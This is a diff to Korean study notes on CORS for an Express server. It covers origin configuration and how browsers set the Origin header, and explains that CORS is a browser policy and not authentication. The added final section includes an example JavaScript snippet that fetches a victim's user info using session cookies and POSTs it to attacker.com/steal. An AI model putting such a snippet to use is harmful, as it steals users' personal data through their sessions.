@@ -19,7 +19,7 @@ const app = express();
 
 // CORS 설정
 app.use(cors({
-    origin: 'https://example-client.com', // 허용할 출처
+    origin: 'https://example.com', // 허용할 출처
     methods: 'GET,POST,PUT,DELETE', // 허용할 메서드
     allowedHeaders: 'Content-Type,Authorization', // 허용할 헤더
     credentials: true // 인증 정보 허용
@@ -37,5 +37,32 @@ app.listen(3000, () => {
 
 ### 예시
 
-front가 localhost:8080/insert로 서버에 요청을 보내면 <br>
-Orgin은 http://localhost:8080 / protocol: http /domain : localhost/port : 8080 이 된다.
+- front가 https://example.com:443 에서 서버로 요청을 보내면
+- Orgin은 https://example.com:443 이 된다
+    - 이 Origin은 브라우저가 자동 작성해주는 것으로, 브라우저의 기능을 통해 cors보안을 할 수 있는 것이다(상호 규약)
+    - 이 Origin은 브라우저가 자동으로 작성하는 값이며, 브라우저는 이 값을 바탕으로 CORS 보안 정책을 적용한다
+    - 즉, 서버가 이 Origin을 보고 요청을 허용할지 거부할지 판단하게 된다
+- explorer 같은 경우는 port가 다르더라도 수신이 가능해 보안상 심각한 문제가 있었다(origin이 443포트가 아닌 8123포트여도 송수신이 문제없이 가능했던 이슈)
+
+### 의문들
+
+- Q : cors 는 그럼 헤더에 origin:원하는 사이트만 넣으면 되는 굉장히 허술한거아님? 토큰이 없다면 어떻게 검증함?
+    -  CORS 자체는 보안 기술이라기보다, 브라우저에 명령하는 “정책”에 가깝다. CORS는 클라이언트(브라우저)를 제어하기 위한 것이지, 서버 보안을 보장하지 않는다.
+    - 브라우저가 보내주는 Origin은 그냥 "신고"일 뿐이다. 진짜 인증은 별도의 메커니즘으로 해야 한다.
+    - 그래서 보통 jwt, session 등을 보안요소로 사용하고, origin만 사용하는 것은 굉장히 위험하다
+
+### js를 해커가 사용하게 되면 위험한 이유
+```javascript
+fetch('https://example.com/api/user-info', {
+  method: 'GET',
+  credentials: 'include', // ← 세션 쿠키까지 보내라는 명령
+})
+.then(res => res.json())
+.then(data => {
+  // 피해자의 개인정보 data를 빼감
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  })
+})
+```
